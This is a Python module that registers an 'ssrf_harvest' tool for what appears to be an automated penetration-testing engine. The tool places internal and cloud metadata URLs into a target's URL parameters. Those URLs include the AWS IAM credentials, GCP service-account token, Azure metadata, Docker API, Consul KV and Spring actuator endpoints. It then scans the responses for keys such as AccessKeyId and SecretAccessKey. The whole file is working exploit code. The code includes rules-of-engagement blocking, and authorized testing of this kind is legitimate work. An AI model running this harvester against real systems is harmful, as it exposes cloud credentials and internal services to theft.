from __future__ import annotations

from .chain_engine import register_tool
from .config import load_engine
from . import http as _http


_INTERNAL_URLS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://localhost:8080/actuator/env",
    "http://localhost:8500/v1/kv/",
    "http://localhost:9200/_cat/indices",
    "http://localhost:6379/",
    "http://localhost:2375/containers/json",
    "http://127.0.0.1:8500/v1/agent/self",
]

_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "computeMetadata", "service-accounts",
    "subscriptionId", "aadClientId", "compartmentId", "droplet_id",
    "propertySources", "resolvers", "_cluster/health",
    "Docker", "Containers",
]

_PARAMS = ["url", "uri", "link", "callback", "webhook", "next", "redirect",
            "redirect_uri", "dest", "destination", "image", "img", "fetch",
            "proxy", "target", "feed", "source", "data", "host", "path"]


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _fetch_target(url, param, target_url, headers, timeout, verify, roe_guard):
    h = {"Accept": "application/json", "Metadata-Flavor": "Google",
         "Metadata": "true"}
    h.update(headers or {})
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.get(url, params={param: target_url}, headers=h)
        return {"status": r.status_code, "body": (r.text or "")[:4000]}
    except _http.ROEBlock as e:
        return {"status": None, "error": "ROE_BLOCK: " + str(e)}
    except _http.TimeoutException:
        return {"status": None, "error": "timeout"}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _tool_ssrf_harvest(orch, args):
    url = args.get("url") or orch.target
    params = args.get("params")
    if isinstance(params, str):
        params = [p.strip() for p in params.split(",") if p.strip()]
    if not params:
        params = _PARAMS[:8]
    headers = args.get("headers") or {}
    verify = _verify_tls()
    roe_guard = getattr(orch, "roe_guard", None)

    findings = []
    attempts = []
    for param in params:
        for target_url in _INTERNAL_URLS:
            r = _fetch_target(url, param, target_url, headers, 8, verify,
                              roe_guard)
            entry = {"param": param, "target": target_url,
                     "status": r.get("status"), "error": r.get("error")}
            attempts.append(entry)
            body = r.get("body") or ""
            for m in _MARKERS:
                if m in body:
                    findings.append({"param": param, "target": target_url,
                                     "marker": m,
                                     "preview": body[:300]})
                    break
            if findings:
                break
        if findings:
            break

    if findings:
        first = findings[0]
        return {
            "verdict": "VULNERABLE",
            "reason": (f"SSRF reached internal service via param "
                       f"'{first['param']}' → {first['target'][:60]} "
                       f"(marker: {first['marker']})"),
            "evidence": {"findings": findings, "attempts": attempts[:40]},
        }
    live = [a for a in attempts if a.get("status") is not None]
    if not live:
        return {"verdict": "UNKNOWN",
                "reason": "no SSRF requests succeeded",
                "evidence": {"attempts": attempts[:20]}}
    return {"verdict": "PASS",
            "reason": f"no internal markers across {len(live)} SSRF attempts",
            "evidence": {"attempts": attempts[:20]}}


register_tool("ssrf_harvest", _tool_ssrf_harvest)
